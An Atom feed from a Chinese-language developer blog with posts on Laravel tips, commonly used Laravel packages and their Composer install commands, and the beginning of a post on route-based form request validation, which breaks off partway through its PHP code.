<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Boo</title>
  
  
  <link href="https://www.0x2beace.com/atom.xml" rel="self"/>
  
  <link href="https://www.0x2beace.com/"/>
  <updated>2021-06-21T13:21:41.663Z</updated>
  <id>https://www.0x2beace.com/</id>
  
  <author>
    <name>Boo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tips of Laravel</title>
    <link href="https://www.0x2beace.com/tips-of-laravel/"/>
    <id>https://www.0x2beace.com/tips-of-laravel/</id>
    <published>2021-06-20T07:00:12.000Z</published>
    <updated>2021-06-21T13:21:41.663Z</updated>
    
    <content type="html"><![CDATA[<p>Awesome tips for Laravel.</p><a id="more"></a><h2 id="善用集合"><a href="#善用集合" class="headerlink" title="善用集合"></a>善用集合</h2><p>Collections 是 Laravel 提供的一个巨大特性，它允许我们轻松地操作数组，可以为我们节省大量时间。</p><p>比如想要对下面这组数据进行求和：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$orders = [</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1000</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">80</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1001</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">120</span>,</span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span> =&gt; <span class="number">1002</span>,</span><br><span class="line">        <span class="string">"price"</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>使用传统的 <code>foreach</code> 方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$total_price = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($orders <span class="keyword">as</span> $order) &#123;</span><br><span class="line">    $total_price += $order[<span class="string">"price"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试试使用集合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total_price = collect($orders)-&gt;pluck(<span class="string">"price"</span>)-&gt;sum();</span><br></pre></td></tr></table></figure><p>虽然两种方式都可以实现，但显然使用集合更容易一些，更多集合的最佳实践可以查看我的另一篇笔记——<a href="https://www.0x2beace.com/the-actual-use-of-collection-in-laravel">Laravel Collection 实际使用</a>。</p><p>善用集合，可以帮我们减少很多重复的代码。</p><h2 id="查询作用域"><a href="#查询作用域" class="headerlink" title="查询作用域"></a>查询作用域</h2><p>通常，在Laravel Eloquent ORM 查询时，需要匹配某些条件时，一般会这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$admin = Admin::where(<span class="string">"is_enable"</span>, <span class="keyword">true</span>)</span><br><span class="line">    -&gt;where(<span class="string">"is_admin"</span>, <span class="keyword">true</span>)</span><br><span class="line">    -&gt;get();</span><br></pre></td></tr></table></figure><p>这样写并没有什么问题，但为了使我们的代码更具可读性，而不是重复性，可以使用 <code>query scope</code>，在对应模型中创建查询作用域：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scopeEnable</span><span class="params">($query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $query-&gt;where(<span class="string">'is_enable'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scopeAdmin</span><span class="params">($query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $query-&gt;where(<span class="string">'is_admin'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，可以通过如下方式进行查询：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$admin = User::enable()</span><br><span class="line">    -&gt;admin()</span><br><span class="line">    -&gt;get();</span><br></pre></td></tr></table></figure><h2 id="Eloqunt-Query"><a href="#Eloqunt-Query" class="headerlink" title="Eloqunt Query"></a>Eloqunt Query</h2><p>实际开发中，因为需求的复杂性，我们往往需要写出各种各样的SQL 来满足查询。</p><p><code>selectRaw()</code>、<code>whereRaw()</code>、<code>havingRaw()</code> 允许我们在查询构造器中，加入原始SQL 查询，例如，统计分组数量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$count = User::groupBy(<span class="string">"is_enable"</span>)</span><br><span class="line">    -&gt;selectRaw(<span class="string">"count(id) as aggregate"</span>)</span><br><span class="line">    -&gt;get();</span><br></pre></td></tr></table></figure><hr><p>如果某个查询条件频繁使用到了，可以在模型中添加全局查询作用域，这样可以默认加上该查询条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">booted</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>::addGlobalScope(<span class="string">"is_deleted"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Builder $builder)</span> </span>&#123;</span><br><span class="line">        $builder-&gt;where(<span class="string">"is_deleted"</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Log-and-Debug"><a href="#Log-and-Debug" class="headerlink" title="Log and Debug"></a>Log and Debug</h2><p>Laravel 为我们提供了便捷的调试代码方式——<code>dd()</code>，但某些场景下并不适合使用 <code>dd()</code>，比如测试回调是否正常。</p><p>这时可以使用 <code>Log</code> 助手函数进行调试，生成的日志在<code>storage/logs</code> 目录下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\Log::debug(<span class="string">'Test Message'</span>, $result]);</span><br></pre></td></tr></table></figure><p><code>dd()</code> 作为现代开发者的调试利器，日常开发基本上离不开它，也许你一直都是这么用的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$users = User::where(<span class="string">'name'</span>, <span class="string">'Taylor'</span>)-&gt;get();</span><br><span class="line">dd($users);</span><br></pre></td></tr></table></figure><p>其实有一种更简单的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$users = User::where(<span class="string">'name'</span>, <span class="string">'Taylor'</span>)-&gt;get()-&gt;dd();</span><br></pre></td></tr></table></figure><p>它可以作为一个链式方法，直接放在 Eloquent Query 或者集合的后面进行调用。</p><h2 id="Tinker"><a href="#Tinker" class="headerlink" title="Tinker"></a>Tinker</h2><p>Laravel 的另一大特性就是提供了交互式的命令行——Tinker，在这里你可以执行各种代码，而无需考虑环境，在某些时候，进行调试时是极为方便的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan tinker</span><br></pre></td></tr></table></figure><p>我通常会使用 <code>Tinker</code> 做以下事情：</p><ul><li>检测某段代码是否符合预期</li><li>Eloquent Query 测试</li><li>SDK 测试</li></ul><h2 id="分页求和"><a href="#分页求和" class="headerlink" title="分页求和"></a>分页求和</h2><p>在有分页的情况下，如何统计某个字段所有记录的总和？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个查询构造器</span></span><br><span class="line">$query = Post::query();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在查询分页之前求和</span></span><br><span class="line">$sum = $query-&gt;sum(<span class="string">'post_views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询分页</span></span><br><span class="line">$posts = $query-&gt;paginate(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><h2 id="Data-Get-Function"><a href="#Data-Get-Function" class="headerlink" title="Data Get Function"></a>Data Get Function</h2><p>如果有一个复杂的数组对象数据结构，可以使用 <code>data_get</code> 助手函数使用<code>.</code> 表示法和 <code>*</code> 通配符从嵌套数组或对象中检索值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$data = [</span><br><span class="line">    <span class="number">0</span> =&gt; [<span class="string">'user_id'</span> =&gt;<span class="string">'1'</span>,  <span class="string">'post'</span> =&gt; [<span class="string">"id"</span> =&gt; <span class="number">1000</span>],],</span><br><span class="line">    <span class="number">1</span> =&gt; [<span class="string">'user_id'</span> =&gt;<span class="string">'2'</span>,  <span class="string">'post'</span> =&gt; [<span class="string">"id"</span> =&gt; <span class="number">1001</span>], ],</span><br><span class="line">    <span class="number">2</span> =&gt; [<span class="string">'user_id'</span> =&gt;<span class="string">'3'</span>,  <span class="string">'post'</span> =&gt; [<span class="string">"id"</span> =&gt; <span class="number">1002</span>], ],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$ids = data_get($data, <span class="string">"*.post.id"</span>);</span><br><span class="line"><span class="comment">// [1000, 1001, 1002]</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Awesome tips for Laravel.&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 常用扩展包整理</title>
    <link href="https://www.0x2beace.com/laravel-commonly-used-extension-package-finishing/"/>
    <id>https://www.0x2beace.com/laravel-commonly-used-extension-package-finishing/</id>
    <published>2021-06-19T12:51:35.000Z</published>
    <updated>2021-06-19T12:52:40.017Z</updated>
    
    <content type="html"><![CDATA[<p>Laravel 开发如此高效，除了其框架本身易用之外，同时也离不开各种丰富的扩展包的支持。</p><a id="more"></a><h2 id="辅助类"><a href="#辅助类" class="headerlink" title="辅助类"></a>辅助类</h2><h3 id="laravel-cors"><a href="#laravel-cors" class="headerlink" title="laravel-cors"></a>laravel-cors</h3><p>所有问题，跨域先行。跨域问题没有解决，一切处理都是纸老虎。</p><p><a href="https://github.com/fruitcake/laravel-cors" target="_blank" rel="noopener">laravel-cors</a> 是一个解决跨域问题的扩展包，不知道是从哪个版本起，已经默认引入框架了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require fruitcake/laravel-cors</span><br></pre></td></tr></table></figure><h3 id="Laravel-lang"><a href="#Laravel-lang" class="headerlink" title="Laravel-lang"></a>Laravel-lang</h3><p><a href="https://github.com/overtrue/laravel-lang" target="_blank" rel="noopener">Laravel-lang</a> 是一个非常易用的语言包，现已支持多达75 种语言。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require <span class="string">"overtrue/laravel-lang:~5.0"</span></span><br></pre></td></tr></table></figure><p>编辑配置文件：<code>config/app.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'locale'</span> =&gt; <span class="string">'zh_CN'</span>,</span><br></pre></td></tr></table></figure><h3 id="Captcha-for-Laravel"><a href="#Captcha-for-Laravel" class="headerlink" title="Captcha for Laravel"></a>Captcha for Laravel</h3><p><a href="https://github.com/mewebstudio/captcha" target="_blank" rel="noopener">captcha</a> 是一个生成验证码的扩展包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require mews/captcha</span><br></pre></td></tr></table></figure><h3 id="Carbon"><a href="#Carbon" class="headerlink" title="Carbon"></a>Carbon</h3><p><a href="http://carbon.nesbot.com/" target="_blank" rel="noopener">Carbon</a> 可以帮助我们在 PHP 开发中处理日期 / 时间变得更加简单、更具语义化。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require nesbot/carbon</span><br></pre></td></tr></table></figure><p>记得设置时区 <code>config/app.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'timezone'</span> =&gt; <span class="string">'PRC'</span>,</span><br></pre></td></tr></table></figure><h3 id="Eloquent-Model-Generator"><a href="#Eloquent-Model-Generator" class="headerlink" title="Eloquent Model Generator"></a>Eloquent Model Generator</h3><p><a href="https://github.com/krlove/eloquent-model-generator" target="_blank" rel="noopener">Eloquent Model Generator</a> 是一个基于代码生成器的 Eloquent Model 生成工具。</p><p>只在开发环境中安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require --dev krlove/eloquent-model-generator</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan krlove:generate:model UserModel --table-name=user --output-path=./Models --namespace=App\\Models</span><br></pre></td></tr></table></figure><h3 id="IDE-Helper"><a href="#IDE-Helper" class="headerlink" title="IDE Helper"></a>IDE Helper</h3><p><a href="https://github.com/barryvdh/laravel-ide-helper#laravel-ide-helper-generator" target="_blank" rel="noopener">Laravel IDE Helper</a> 是一个代码提示及补全工具。</p><p>只在开发环境中安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require --dev barryvdh/laravel-ide-helper</span><br></pre></td></tr></table></figure><p>对于只在开发环境中需要安装的扩展包，在 app/Providers/AppServiceProvider.php 文件中以如下方式进行注册：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;app-&gt;environment() !== <span class="string">'production'</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;register(\Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基础用法：</p><ul><li><code>php artisan ide-helper:generate</code>：为 Facades 生成注释</li><li><code>php artisan ide-helper:models</code>：</li><li><code>php artisan ide-helper:meta</code>：生成 PhpStorm Meta file</li></ul><h4 id="为-Facades-生成注释"><a href="#为-Facades-生成注释" class="headerlink" title="为 Facades 生成注释"></a>为 Facades 生成注释</h4><p>运行一下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:generate</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>_ide_helper.php</code> 文件。</p><h4 id="为模型生成注解"><a href="#为模型生成注解" class="headerlink" title="为模型生成注解"></a>为模型生成注解</h4><p>使用Laravel 为我们提供的 <code>make:model</code> 默认不会为在模型文件中，生成相应的注解。</p><p>当我们需要通过对象获取模型的某个属性时，IDE 这时会提示未定义的属性，虽然不会影响功能的使用，但是对于开发人员来说并不友好。</p><p>看起来就像这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605110602.png" alt=""></p><p>使用<code>IDE Helper</code> 来生成模型注解：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:models <span class="string">"App\Models\UserModel"</span></span><br><span class="line"></span><br><span class="line">Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes/No):  (yes/no) [no]:</span><br></pre></td></tr></table></figure><p>建议选择『yes』，否则会生成「_ide_helper_models.php」文件，这样在跟踪文件的时候不会跳转到「_ide_helper_models.php」文件。</p><p>如果希望为所有模型都加上注解，则省略后面的参数。</p><p>看起来好多了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605111205.png" alt=""></p><blockquote><p>注意： 为模型生成字段信息必须在数据库中存在相应的数据表。</p></blockquote><h4 id="自动为链式操作注释"><a href="#自动为链式操作注释" class="headerlink" title="自动为链式操作注释"></a>自动为链式操作注释</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:meta</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>.phpStorm.meta.php</code> 文件。</p><h3 id="Laravel-Query-Logger"><a href="#Laravel-Query-Logger" class="headerlink" title="Laravel Query Logger"></a>Laravel Query Logger</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require overtrue/laravel-query-logger --dev</span><br></pre></td></tr></table></figure><p>启用日志记录 <code>config/logging.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加入以下配置，开启日志查询记录</span></span><br><span class="line"><span class="string">'query'</span> =&gt; [</span><br><span class="line">    <span class="string">'enabled'</span> =&gt; env(<span class="string">'LOG_QUERY'</span>, env(<span class="string">'APP_ENV'</span>) === <span class="string">'local'</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only record queries that are slower than the following time</span></span><br><span class="line">    <span class="comment">// Unit: milliseconds</span></span><br><span class="line">    <span class="string">'slower_than'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only record queries when the QUERY_LOG_TRIGGER is set in the environment,</span></span><br><span class="line">    <span class="comment">// or when the trigger HEADER, GET, POST, or COOKIE variable is set.</span></span><br><span class="line">    <span class="string">'trigger'</span> =&gt; env(<span class="string">'QUERY_LOG_TRIGGER'</span>),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f ./storage/logs/laravel.log</span><br></pre></td></tr></table></figure><h2 id="开发类"><a href="#开发类" class="headerlink" title="开发类"></a>开发类</h2><h3 id="jwt-auth"><a href="#jwt-auth" class="headerlink" title="jwt-auth"></a>jwt-auth</h3><p><a href="https://github.com/tymondesigns/jwt-auth" target="_blank" rel="noopener">jwt-auth</a> 是 Laravel 和 lumen 下一个优秀 JWT 组件。</p><p>具体使用介绍可以查看我的——<a href="https://www.0x2beace.com/laravel-jwt-auth-use-detailed-explanation/">Laravel jwt-auth 使用详解</a> 。</p><h3 id="laravel-enum"><a href="#laravel-enum" class="headerlink" title="laravel-enum"></a>laravel-enum</h3><p><a href="https://github.com/BenSampo/laravel-enum" target="_blank" rel="noopener">laravel-enum</a> 是一个简单易用，扩展性高的处理枚举的扩展包。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require bensampo/laravel-enum</span><br></pre></td></tr></table></figure><h3 id="Intervention-image"><a href="#Intervention-image" class="headerlink" title="Intervention/image"></a>Intervention/image</h3><p><a href="https://github.com/Intervention/image" target="_blank" rel="noopener">Intervention/image</a> 是一个处理图片裁切的扩展包，对应的API 文档在<a href="http://image.intervention.io/api/crop" target="_blank" rel="noopener">这里</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require intervention/image</span><br></pre></td></tr></table></figure><h3 id="laravel-wechat"><a href="#laravel-wechat" class="headerlink" title="laravel-wechat"></a>laravel-wechat</h3><p><a href="https://github.com/overtrue/laravel-wechat" target="_blank" rel="noopener">微信 SDK for Laravel</a>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require <span class="string">"overtrue/laravel-wechat"</span></span><br></pre></td></tr></table></figure><h3 id="easy-sms"><a href="#easy-sms" class="headerlink" title="easy-sms"></a>easy-sms</h3><p><a href="https://github.com/overtrue/easy-sms" target="_blank" rel="noopener">easy-sms</a> 一款满足你的多种发送需求的短信发送组件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require <span class="string">"overtrue/easy-sms"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Laravel 开发如此高效，除了其框架本身易用之外，同时也离不开各种丰富的扩展包的支持。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Request 类实现路由场景验证</title>
    <link href="https://www.0x2beace.com/laravel-request-class-implements-routing-scenario-verification/"/>
    <id>https://www.0x2beace.com/laravel-request-class-implements-routing-scenario-verification/</id>
    <published>2021-06-14T08:19:23.000Z</published>
    <updated>2021-06-14T08:20:04.773Z</updated>
    
    <content type="html"><![CDATA[<p>在Laravel 中，有很多方法可以验证传入的数据，对于表单请求，通常主要有两种方式：</p><ol><li>在控制器中使用<code>ValidatesRequests</code> 的 <code>validate()</code>方法</li><li>创建表单验证类</li></ol><a id="more"></a><p>对于第一种方式，只适用一些功能单一、验证规则比较简单的验证场景。</p><p>对于复杂一些的验证场景，使用表单验证，会更方便一些。</p><p>经常使用表单验证的同学可能会知道，Request 类也不会万能的，对于一些重复使用的验证规则，默认的Request 类，并没有提供好的验证规则复用方法。</p><p>所以有没有某种方案，最终可以解决以下需求：</p><ol><li><code>rules()</code> 方法只需要返回一个该请求的验证规则数组</li><li>基于路由场景验证，不同的验证场景可以使用相同的验证规则</li><li>对于字段相同，但是验证规则不同的情况，可以重置验证规则</li></ol><p>感谢 <a href="https://learnku.com/blog/sirping" target="_blank" rel="noopener">sirping</a> 的 <a href="https://learnku.com/articles/38825#863a85" target="_blank" rel="noopener">Laravel 验证类 实现 路由场景验证 和 控制器场景验证</a>，提供了一个基于路由的场景验证的简单易用方案。</p><h2 id="重写FormRequest-类"><a href="#重写FormRequest-类" class="headerlink" title="重写FormRequest 类"></a>重写FormRequest 类</h2><p>因为每一个Request 类，后面都会使用到场景验证，所以这里直接创建一个基类继承于 <code>FormRequest</code>类，并重写相关方法：</p><p><code>app/Http/Requests/BaseRequest.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Requests</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Traits</span>\<span class="title">ApiResponse</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Validation</span>\<span class="title">Factory</span> <span class="title">as</span> <span class="title">ValidationFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Validation</span>\<span class="title">Validator</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span 